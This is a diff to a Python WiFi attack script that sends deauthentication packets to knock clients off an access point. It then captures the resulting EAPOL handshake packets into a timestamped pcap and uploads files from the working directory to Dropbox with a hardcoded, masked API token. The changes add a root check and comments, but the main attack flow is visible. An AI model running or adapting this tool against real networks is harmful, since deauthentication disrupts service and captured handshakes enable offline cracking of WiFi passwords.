@@ -2,6 +2,7 @@ import argparse
 import os
 import shutil
 import subprocess
+import sys
 import threading
 import time
 from datetime import datetime
@@ -25,6 +26,12 @@ class bcolors:
 
 
 packet_list = []
+
+
+def is_root():
+    if os.geteuid() != 0:
+        print("This Program must run with root privileges, Exiting...")
+        sys.exit()
 
 
 def check_args():
@@ -77,7 +84,7 @@ def send_deauth_packet():
 
 
 def dropbox_uploader():
-    dbx = dropbox.Dropbox('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
+    dbx = dropbox.Dropbox('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
     rootdir = os.getcwd()
     print("Attempting to upload...")
     for dir, dirs, files in os.walk(rootdir):
@@ -97,13 +104,15 @@ def dropbox_uploader():
 
 
 if __name__ == '__main__':
+    is_root()
     iface, ap, client, channel, deauth_count, pcap_file = check_args()
-    pcap_file = os.path.splitext(pcap_file)[0] + '_' + datetime.now().strftime("%Y_%m_%d-%H-%M-%S") + '.pcap'
+    pcap_file = os.path.splitext(pcap_file)[0] + '_' + datetime.now().strftime("%Y_%m_%d-%H-%M-%S") + '.pcap'  # Add
+    # current time in the middle of pcap file name
     os.system('iwconfig %s channel %s' % (iface, channel))  # Set WiFi Adapter On right Channel
-    t = threading.Thread(target=sniffer)  # Start Sniffing in backgroud.
-    t.start()
+    t = threading.Thread(target=sniffer)  # Configure Sniffing in backgroud.
+    t.start()  # Start Sniffing in the backgroud.
     time.sleep(2)  # Wait 2 seconds for sniffing to start.
-    send_deauth_packet()
+    send_deauth_packet()  # Send Deauth packet function.
     print(f"{bcolors.OKBLUE}Sent %s Deauth Packet(s){bcolors.ENDC}" % deauth_count)
     t.join()
     print(f"{bcolors.WARNING}Captured Total %s EAPOL Packets{bcolors.ENDC}" % (len(packet_list)), '\n')
